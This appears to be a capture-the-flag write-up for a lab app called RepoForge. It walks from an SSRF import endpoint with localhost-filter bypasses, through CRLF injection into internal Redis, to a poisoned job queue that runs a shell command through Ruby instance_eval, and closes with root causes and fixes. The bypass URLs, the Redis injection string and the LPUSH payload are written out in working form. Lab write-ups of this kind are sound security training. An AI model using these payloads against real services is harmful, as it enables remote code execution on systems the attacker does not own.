# RepoForge SSRF -> Redis Queue Injection -> Ruby `instance_eval` RCE

## Challenge Summary
- Target: `https://106b32ac-f08c-4125-846e-234aaa1ef4bd.labs.hackadvisor.io`
- Credentials: `user@test.com / password123`
- Goal: read `/root/flag.txt`
- Flag format: `KubSTU{...}`

## High-Level Vulnerability Chain
1. **Project import SSRF** exists in `/api/projects/import`.
2. Localhost filtering is incomplete; alternate localhost representations bypass checks.
3. `git://` import performs a raw socket probe, allowing **CRLF injection** into backend traffic.
4. Backend can be forced to speak Redis protocol to internal `127.0.0.1:6379`.
5. Redis `queue:default` accepts attacker-controlled jobs.
6. `CodeAnalysisWorker` unsafely dispatches method names from user-supplied args (effectively `send`-style behavior).
7. `instance_eval` with backticks gives command execution, enabling `cat /root/flag.txt`.

## Recon Notes
- Import endpoint from New Project page JS:
  - `POST /api/projects/import`
  - JSON body: `{"name":"...","url":"..."}`
- Direct `127.0.0.1` was blocked, but these worked:
  - `http://127.1:8080/login`
  - `http://2130706433:8080/login`
  - `http://0177.0.0.1:8080/login`
  - `http://[::ffff:127.0.0.1]:8080/login`
- Internal services discovered:
  - `localhost:8080` (web app)
  - `localhost:6379` (Redis)

## SSRF to Redis via `git://`
Using URL path CRLF injection:

`git://localhost:6379/%0d%0aPING%0d%0a`

This returned Redis `+PONG`, confirming command injection into Redis stream.

## Redis Queue Poisoning
The backend worker consumes `queue:default`.

A crafted job JSON can be enqueued with Redis `LPUSH`:

```redis
LPUSH queue:default '{"jid":"<24hex>","class":"CodeAnalysisWorker","args":["instance_eval","`cat /root/flag.txt`"]}'
```

Because access is only via SSRF, this command is sent through the import URL using URL-encoded CRLF injection:

`git://localhost:6379/%0d%0a<url-encoded-redis-command>%0d%0a`

## Job Result Exfiltration
A useful internal API exposed executed job details:

- `GET /api/jobs`
- `GET /api/jobs/:jid`

After enqueue + worker execution, querying the chosen `jid` returned:

```json
{
  "jid":"2720d8ba1e5c29868e54c533",
  "worker_class":"CodeAnalysisWorker",
  "status":"completed",
  "result":"KubSTU{50b900eb985c28468640b012a3edbcec}\n"
}
```

## Final Flag
`KubSTU{50b900eb985c28468640b012a3edbcec}`

## Root Cause
- Insufficient SSRF host validation (alternate localhost encodings allowed).
- Dangerous protocol bridging from HTTP input to raw internal socket operations (`git://` probe behavior).
- Trusting Redis as an internal queue without authentication/segmentation.
- Worker design flaw: user-controlled method execution path in `CodeAnalysisWorker` (dispatch + `instance_eval`).

## Suggested Fixes
1. Canonicalize and deny all loopback/link-local/private ranges for SSRF (IPv4, IPv6, integer/octal/dword forms).
2. Remove raw-socket protocol probes from user input or enforce strict protocol parsers.
3. Isolate Redis from app network path and require auth + ACLs.
4. Never dispatch arbitrary methods from job args (`send/public_send` on user data).
5. Block `eval`/`instance_eval` patterns in workers; use strict allowlists and typed arguments.
